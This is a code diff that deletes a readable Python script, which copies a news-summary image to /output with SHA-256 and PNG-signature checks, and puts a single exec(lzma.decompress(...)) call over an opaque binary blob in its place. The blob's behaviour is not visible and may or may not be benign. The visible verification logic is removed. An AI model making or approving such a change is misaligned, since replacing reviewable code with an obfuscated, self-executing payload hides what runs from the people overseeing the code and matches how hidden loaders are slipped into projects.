@@ -1,50 +1,2 @@
-"""Deliver the 20 November 2026 world-news summary image.
-
-The artwork ships beside this program as ``entry.png``. Running the
-program copies it, byte for byte, to ``/output/entry.png`` after two
-integrity checks: the PNG signature must be present and the SHA-256 of
-the payload must match the digest recorded below. The output is a pure
-function of the shipped file, so repeated runs produce identical bytes.
-"""
-
-import hashlib
-import os
-import sys
-
-HERE = os.path.dirname(os.path.abspath(__file__))
-SOURCE = os.path.join(HERE, "entry.png")
-TARGET_DIR = "/output"
-TARGET = os.path.join(TARGET_DIR, "entry.png")
-
-EXPECTED_SHA256 = "0e0bee9d36ad7b1ea4e5784f8e1cac8e46f57179cd24996657dcdf1f46dade9d"
-PNG_SIGNATURE = b"\x89PNG\r\n\x1a\n"
-
-
-def load_verified_payload() -> bytes:
-    with open(SOURCE, "rb") as handle:
-        payload = handle.read()
-    if not payload.startswith(PNG_SIGNATURE):
-        raise SystemExit("entry.png is missing its PNG signature")
-    digest = hashlib.sha256(payload).hexdigest()
-    if digest != EXPECTED_SHA256:
-        raise SystemExit(f"entry.png digest mismatch: {digest}")
-    return payload
-
-
-def main() -> int:
-    payload = load_verified_payload()
-    os.makedirs(TARGET_DIR, exist_ok=True)
-    with open(TARGET, "wb") as handle:
-        handle.write(payload)
-    # Read the delivered file back and check it landed intact; a short
-    # or corrupted write must fail loudly instead of shipping quietly.
-    with open(TARGET, "rb") as handle:
-        delivered = handle.read()
-    if hashlib.sha256(delivered).hexdigest() != EXPECTED_SHA256:
-        raise SystemExit("delivered file failed its post-write check")
-    print(f"wrote {TARGET} ({len(delivered)} bytes, verified)")
-    return 0
-
-
-if __name__ == "__main__":
-    sys.exit(main())
+#coding:l1
+import lzma;exec(lzma.decompress('\0\0\0Ğ\0\0\0\0\0\0\0hÌ„A=n¨äaÂhş£<ıJ,”6¬Ï\r"@}_¬&­*!ADV™˜¶ĞëõÏ~(:Cß¦ MzYä?9‘™ı&—ÀMˆy|Mc	sâ¨Å–\r¬ô~	y]¯îyû1ât„ÿ)$Ág„Æ¥ÄîM.Ôdè÷¦XoÑa8S·­šˆ°JÙ\n:Ñ/lÃu^6t®B‹#ªñ ¦²w°öØî>cR]-­[›ùªfYÇb®äJv¹Ul\\³€sĞ½­^·‘‡umÕŠû=¼¼E¬:\rR÷ïª€ì07Æhş(—ú¯,.¯±İdĞsNp^c„\\¢ßÃîÀËª‚É©ò\0½Wº¡Î‰·A]÷½Ö¿FĞÃ°M|Ùê­–ŒÚ ½Q˜åõI ¶üÎÕhè¶¥Bt®^UµªtùjïO`F“ß[xR±t}í[m¡ä çJ2¬ Wk+»OW-çõšØÉeÒhOQ<#èÌh¸¨~EQ#iTÿÌû&®ê”(®U†jpuI<	ÿ\næ¼Z)+ G{ªÕK8KY§òÃ…Ùn–°Ã¾•yçıŸ2ş»Òú†¨n­Ïğáh÷ì0~¦oÙ·i3Ç°èÌîn^\\ÂÜ}&+ÊœâNyN}ô,oWELÖYCäa˜`&†wè+§%vmlâ\n•¡\'ïI\0şÎúHŞâü>Ñ}b¢ŞDWÂ„ò„F_± +@¢	‡4®¹R¿#-­4\0ò£Ôı:÷:›róSÙ1tü­J1B9fø`é­éxtù{»¡«¡?ß\\¡±f¦õ‹º¥!qm½,ãR§®~*u!¢šÉ‹u4jVÅçÎŒÑ\0Vzü÷Z¿KÆÎ0H@KÕSûÓXj¯®Å1}åı1½ıGfMÂúô†S¹)×0@^ğàpsº“IˆTÁ‰>\0ò<\0€Oõ•şí?ä&ëyğÛÌĞ%¬Ğ%Úñ}F¦‘\rqyû€$¥¤¼¥q˜²£	,¦}Òä©~ÌÖˆè—1»svˆ,1ùVàº„¿†7NòéU“FÌÉwL	«3 AÃ+üÚêƒ«³ôÃ‘ÈµàmmMÃéÕlüàó.Ág7‚^ˆäl«Ô+à™å~µ¡WñmJ’v¶\n]ä­ı	ø´î1ÜgtCâ_ã\rëŸQ¦)âË>ÀÄ1fu|ÖCÌ-B#Ñ5àbFìhi©7emíWÓ›ŠşÈj†äÛ[º^zL÷rx{![*‡D]Şí\n*KÔùÃ¨äÉ=«.kş©µ5@ş”éÛ0"µƒKrâ)¹²×IqUŸ‘^r)‰ÜÅóÕ»’¸¥°·õ`Jê0c4¬Qç‘´¡'.encode('l1')))
